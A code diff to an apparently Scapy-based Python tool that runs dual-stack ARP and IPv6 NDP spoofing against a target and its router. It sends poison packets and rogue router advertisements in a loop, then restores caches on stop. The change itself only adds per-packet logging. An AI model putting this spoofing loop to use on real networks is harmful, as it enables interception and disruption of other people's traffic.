@@ -103,18 +103,25 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
         pkt_ra_multicast = Ether(dst="33:33:00:00:00:01", src=my_mac) / ra_base
 
         log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")
+        from .logger import log_packet
 
         while not stop_event.is_set():
             try:
                 # Send IPv4 ARP poison
                 sendp(pkt_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_to_router, iface=npf_iface, verbose=0)
+                log_packet("SPOOF", "ARP", my_mac, target_mac, length=42, details=f"ARP poison: tell {target_ip} gateway is {my_mac}", session_id=interface)
+                log_packet("SPOOF", "ARP", my_mac, router_mac, length=42, details=f"ARP poison: tell {router_ip} {target_ip} is {my_mac}", session_id=interface)
+
                 # Send IPv6 NDP NA poison
                 sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
+                log_packet("SPOOF", "ICMPv6", my_mac, target_mac, length=72, details=f"NDP NA poison: {target_ipv6_ll} override", session_id=interface)
+
                 # Send IPv6 SLAAC/RA deprecation
                 sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
                 sendp(pkt_ra_multicast, iface=npf_iface, verbose=0)
+                log_packet("SPOOF", "ICMPv6", my_mac, "ff02::1", length=len(pkt_ra_multicast), details="Rogue RA lifetime=0 SLAAC deprecation", session_id=interface)
 
                 # Realtime Self-Healing Watchdog for Host PC:
                 # If Windows host ARP cache ever accidentally maps the gateway to host's own MAC
@@ -182,6 +189,9 @@ def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac
             sendp(restore_na_target, iface=npf_iface, verbose=0)
             sendp(restore_na_router, iface=npf_iface, verbose=0)
             time.sleep(0.15)
+
+        from .logger import log_packet
+        log_packet("RESTORE", "ARP", router_mac, target_mac, length=42, details=f"Gratuitous ARP/NDP restore for {target_ip}", session_id=interface)
 
     except Exception as e:
         log.warning(f"ARP restore failed for {target_ip}: {e}")
